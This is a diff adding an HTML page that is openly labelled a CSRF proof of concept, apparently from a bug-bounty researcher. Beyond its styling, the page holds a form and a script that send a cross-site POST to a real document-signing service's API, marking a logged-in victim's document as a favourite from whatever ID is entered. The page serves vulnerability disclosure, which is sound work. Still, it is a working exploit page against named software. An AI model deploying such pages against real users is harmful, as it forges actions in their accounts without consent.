@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CSRF</title>
+  <style>
+    body {
+      font-family: 'Arial', sans-serif;
+      background: linear-gradient(to right, #00c6ff, #0072ff);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+
+    .container {
+      background: white;
+      padding: 30px 50px;
+      border-radius: 10px;
+      box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.1);
+      text-align: center;
+      width: 100%;
+      max-width: 500px;
+    }
+
+    h1 {
+      font-size: 24px;
+      color: #333;
+      margin-bottom: 20px;
+      font-weight: 600;
+    }
+
+    label {
+      display: block;
+      font-size: 16px;
+      color: #333;
+      margin-bottom: 10px;
+      font-weight: 500;
+    }
+
+    input[type="text"] {
+      width: 100%;
+      padding: 12px;
+      font-size: 16px;
+      border: 2px solid #0072ff;
+      border-radius: 5px;
+      outline: none;
+      margin-bottom: 20px;
+      transition: border 0.3s ease;
+    }
+
+    input[type="text"]:focus {
+      border-color: #00c6ff;
+    }
+
+    input[type="submit"] {
+      width: 100%;
+      padding: 12px;
+      background-color: #0072ff;
+      color: white;
+      font-size: 18px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+
+    input[type="submit"]:hover {
+      background-color: #005bb5;
+    }
+
+    footer {
+      margin-top: 20px;
+      font-size: 14px;
+      color: #aaa;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="container">
+    <h1>CSRF PoC: Make Documents Favorite</h1>
+    <form action="https://app.signnow.com/snapi/v2/documents" method="POST" id="submitForm">
+      <label for="documents_ID">Submit Documents ID:</label>
+      <input type="text" id="documents_ID" name="documents_ID" required placeholder="Enter Document ID">
+      <input type="submit" value="Submit request">
+    </form>
+    <footer>
+      <p>Powered by <a href="https://www.bughuntar.com" target="_blank" style="color: #0072ff;">Professor Software Solutions</a></p>
+    </footer>
+  </div>
+
+  <script>
+    // Dynamically update the form action with the document ID
+    document.getElementById('submitForm').addEventListener('submit', function (e) {
+      const documentId = document.getElementById('documents_ID').value;
+      if (documentId) {
+        this.action = "https://app.signnow.com/snapi/v2/documents/" + documentId + "/favorites";
+      }
+    });
+  </script>
+</body>
+
+</html>
